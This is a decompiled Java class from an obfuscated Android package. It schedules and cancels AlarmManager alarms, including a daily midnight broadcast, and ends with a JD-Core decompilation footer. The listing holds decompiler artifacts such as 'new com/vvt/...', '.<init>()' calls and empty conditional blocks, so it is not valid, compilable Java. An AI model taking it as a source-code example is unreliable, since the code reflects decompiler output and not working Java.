package com.vvt.temporalcontrol.normal;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import com.vvt.temporalcontrol.c;
import java.util.ArrayList;
import java.util.GregorianCalendar;
import java.util.Iterator;

public class NormalTaskScheduler
  implements com.vvt.temporalcontrol.a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.c;
  private static final boolean c = com.vvt.ak.a.b;
  private static final boolean d = com.vvt.ak.a.d;
  private static final boolean e = com.vvt.ak.a.e;
  private NormalTaskScheduler.TaskScheduledReceiver f;
  private NormalTaskScheduler.MidnightReceiver g;
  private Context h;
  private c i;
  private ArrayList j;
  private ArrayList k;
  private boolean l;
  private final BroadcastReceiver m;
  
  public NormalTaskScheduler(Context paramContext)
  {
    Object localObject = new com/vvt/temporalcontrol/normal/b;
    ((b)localObject).<init>(this);
    this.m = ((BroadcastReceiver)localObject);
    this.h = paramContext;
    localObject = new java/util/ArrayList;
    ((ArrayList)localObject).<init>();
    this.j = ((ArrayList)localObject);
  }
  
  public void a()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.l;
    if (!bool)
    {
      bool = true;
      this.l = bool;
      Thread localThread = new java/lang/Thread;
      a locala = new com/vvt/temporalcontrol/normal/a;
      locala.<init>(this);
      localThread.<init>(locala);
      localThread.start();
    }
    bool = a;
    if (bool) {}
  }
  
  public void a(c paramc)
  {
    this.i = paramc;
  }
  
  public void a(ArrayList paramArrayList)
  {
    this.k = paramArrayList;
  }
  
  public void b()
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = this.l;
    if (bool1)
    {
      bool1 = false;
      this.l = false;
      Object localObject1 = this.f;
      if (localObject1 != null)
      {
        localObject1 = this.h;
        localObject2 = this.f;
        ((Context)localObject1).unregisterReceiver((BroadcastReceiver)localObject2);
        bool1 = false;
        localObject1 = null;
        this.f = null;
      }
      localObject1 = (AlarmManager)this.h.getSystemService("alarm");
      Object localObject2 = this.j;
      Iterator localIterator = ((ArrayList)localObject2).iterator();
      for (;;)
      {
        boolean bool2 = localIterator.hasNext();
        if (!bool2) {
          break;
        }
        localObject2 = (PendingIntent)localIterator.next();
        ((PendingIntent)localObject2).cancel();
        ((AlarmManager)localObject1).cancel((PendingIntent)localObject2);
      }
    }
    bool1 = a;
    if (bool1) {}
  }
  
  public void c()
  {
    boolean bool1 = a;
    if (bool1) {}
    AlarmManager localAlarmManager = (AlarmManager)this.h.getSystemService("alarm");
    Object localObject1 = new android/content/IntentFilter;
    ((IntentFilter)localObject1).<init>("com.vvt.temporalcontrol.normal.MidnightReceiver");
    Object localObject2 = this.g;
    if (localObject2 == null)
    {
      localObject2 = new com/vvt/temporalcontrol/normal/NormalTaskScheduler$MidnightReceiver;
      ((NormalTaskScheduler.MidnightReceiver)localObject2).<init>(this);
      this.g = ((NormalTaskScheduler.MidnightReceiver)localObject2);
      localObject2 = this.h;
      localObject3 = this.g;
      ((Context)localObject2).registerReceiver((BroadcastReceiver)localObject3, (IntentFilter)localObject1);
    }
    localObject1 = new java/util/GregorianCalendar;
    ((GregorianCalendar)localObject1).<init>();
    boolean bool2 = a;
    if (bool2) {}
    int i1 = 1;
    ((GregorianCalendar)localObject1).add(5, i1);
    ((GregorianCalendar)localObject1).set(11, 0);
    ((GregorianCalendar)localObject1).set(12, 0);
    ((GregorianCalendar)localObject1).set(13, 0);
    int n = 14;
    ((GregorianCalendar)localObject1).set(n, 0);
    localObject2 = new android/content/Intent;
    ((Intent)localObject2).<init>("com.vvt.temporalcontrol.normal.MidnightReceiver");
    Object localObject3 = this.h;
    int i2 = -1 >>> 1;
    localObject2 = PendingIntent.getBroadcast((Context)localObject3, i2, (Intent)localObject2, 0);
    long l1 = ((GregorianCalendar)localObject1).getTimeInMillis();
    localAlarmManager.set(0, l1, (PendingIntent)localObject2);
    bool1 = a;
    if (bool1) {}
  }
  
  public void d()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject1 = this.g;
    if (localObject1 != null)
    {
      localObject1 = this.h;
      localObject2 = this.g;
      ((Context)localObject1).unregisterReceiver((BroadcastReceiver)localObject2);
      bool = false;
      localObject1 = null;
      this.g = null;
    }
    localObject1 = (AlarmManager)this.h.getSystemService("alarm");
    Object localObject2 = new android/content/Intent;
    ((Intent)localObject2).<init>("com.vvt.temporalcontrol.normal.MidnightReceiver");
    Context localContext = this.h;
    int n = -1 >>> 1;
    localObject2 = PendingIntent.getBroadcast(localContext, n, (Intent)localObject2, 0);
    ((AlarmManager)localObject1).cancel((PendingIntent)localObject2);
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/temporalcontrol/normal/NormalTaskScheduler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */